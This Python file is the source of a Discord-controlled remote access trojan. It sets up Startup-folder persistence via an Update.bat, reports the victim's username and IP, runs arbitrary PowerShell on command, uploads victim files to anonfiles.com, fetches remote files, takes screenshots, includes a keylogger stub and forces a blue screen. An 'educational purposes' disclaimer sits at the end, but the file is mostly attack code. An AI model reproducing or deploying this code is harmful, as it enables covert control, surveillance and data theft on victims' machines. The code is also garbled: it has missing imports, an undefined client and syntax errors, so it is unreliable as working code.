# -*- coding: utf-8 -*-

from pynput.keyboard import Key, Listener
import discord
from discord.ext import commands
import asyncio
import commands
import threading
import sys
import time
import ctypes


#client since we wont run it as a bot bot.run or bot_token = ""

client_intents = discord.Client(Intents=discord.Intents.all())
session_id = os.urandom(9).hex()
guild_id = "" #your server id


#creates a start cmd with a bat and makes a Update.bat so everytime the user logs in it triggers and auto executes the script
def wakeup(file_path=""):
	temp = os.getenv("TEMP")
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
	if file_path == "":
		file_path = sys.argv[0]
	with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)


@client.event
async def on_ready():
    guild = client.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_a = requests.get("https://ipapi.co/json/").json()
    data= ip_a ['country_name'], ip_a['ip']
    embed = discord.Embed(title="New session created", description="", color=ff0000)
    embed.add_field(name="session", value=f"```{session_id}```", inline=True)
    embed.add_field(name="user", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="ip addr", value=f"```{data}```", inline=True)
    embed.add_field(name="cmds", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.channel.name != session_id:
        return

    command_handlers = {
        "help": handle_help,
        "ping": handle_ping,
        "cd": handle_cd,
        "ls": handle_ls,
        "download": handle_download,
        "upload": handle_upload,
        "shell": handle_shell,
        "run": handle_run,
        "exit": handle_exit,
        "startup": handle_startup,
        "blue": handle_blue,
        "screenshot": handle_screenshot,
        "keylogger": handle_keylog,
    }

    command_parts = message.content.split()
    command_name = command_parts[0]

    if command_name in command_handlers:
        await command_handlers[command_name](message, command_parts[1:])
    else:
        await message.reply("Unknown command")

# those are the main command handlers

async def handle_help(message, args):
    embed = create_embed("Help", commands)
    await message.reply(embed=embed)

async def handle_ping(message, args):
    embed = create_embed("Ping", f"{round(client.latency * 1000)}ms")
    await message.reply(embed=embed)

async def handle_ls(message, args):
	files = "\n".join(os.listdir())
        if files == "":
            files = "No Files Found"
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)


#shell handler
async def handle_shell(message, args):	
    try:
        command = message.content.split(" ")[1]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        ).communicate()[0].decode("utf-8")

        if output == "":
            output = "No output"

        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

#exception so if like theres an error it logs the error and sends it to the guild 
    except Exception as e:
        print(f"there is an error executing this command: {e}")
        embed = discord.Embed(title="Error", description=f"```{e}```", color=0xfafafa)
        await message.reply(embed=embed)



async def handle_startup(message, args):
    await message.reply("hey")
    await startup()


async def handle_exit(message, args):
	await.message.channel.delete()
	await client.close



async def handle_download(message, args):
    	file = message.content.split(" ")[1]
        try:
            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
            await message.reply(embed=embed)


async def handle_upload(message, args):
        link = message.content.split(" ")[1]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

async def handle_keylog(message, args):
    global count, keys
    count += 1
    
    if len(args) > 0:
        key = args[0]
        keys.append(key)

    if count >= 200:
        count = 0
        keylog_message = "\n".join(keys)
        keys = []  

        channel = message.channel
        await channel.send(f"Keylog:\n```{keylog_message}```")


	

async def handle_blue(message, args):
    await message.reply("attempting...", delete_after=0.1)
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    
    try:
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
    await message.reply("blue works!")
        else:
            await message.reply("blue doesnt work! :(")
    except Exception as e:
        await message.reply(f"an error occurred: {e}")

async def handle_screenshot(message, args):
    screenshot = pyautogui.screenshot()
    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
    screenshot.save(path)
    file = discord.File(path)
    embed = discord.Embed(title="Screenshot", color=COLOR_FAFAFA)
    embed.set_image(url="attachment://screenshot.png")
    await message.reply(embed=embed, file=file)

def create_embed(title, description):
    return discord.Embed(title=title, description=f"```{description}```", color=COLOR_FAFAFA)


client.run('') #your bot token

"""
brief description:
this code is intended for malware analysis and educational purposes only.

additional details:
- it uses the discord api for the message handlers.
- it includes a keylogger feature using pynput.
- i might update this in the future if everything runs well!
"""
